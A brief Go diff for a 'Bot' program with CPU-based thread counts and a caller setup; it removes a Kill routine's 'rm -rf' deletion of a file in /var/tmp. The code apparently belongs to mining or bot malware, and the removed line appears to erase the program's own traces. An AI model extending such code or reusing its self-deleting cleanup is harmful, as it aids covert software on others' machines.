@@ -81,10 +81,7 @@ func (b Bot) threadsNumber() string {
 	return strconv.Itoa(b.CPU * 2)
 }
 
-func Kill() {
-	defer syscall.Exit(0)
-	execComd("rm", "-rf", "/var/tmp/"+fileName(true))
-}
+func Kill() { syscall.Exit(0) }
 
 func (b *Bot) Update() {
 	if setCall, setKey := SetupCaller(); setKey {
